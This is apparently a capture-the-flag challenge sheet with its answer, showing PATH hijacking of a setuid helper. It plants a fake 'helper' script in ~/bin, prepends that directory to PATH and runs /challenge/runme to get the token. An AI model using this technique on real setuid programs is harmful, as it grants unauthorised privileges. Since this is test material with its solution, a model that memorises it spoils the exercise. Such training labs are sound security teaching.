Challenge 09 - PATH hijacking

Goal: Trick the setuid helper into running your own program.

Hints:
- /challenge/runme executes a program named "helper" using PATH.
- Create ~/bin/helper and prepend ~/bin to PATH.
- The helper should print the token.

Solve:
mkdir -p ~/bin
printf '#!/usr/bin/env bash\necho token-09-path\n' > ~/bin/helper
chmod +x ~/bin/helper
export PATH="$HOME/bin:$PATH"
/challenge/runme
cat /tmp/token.txt | readflag
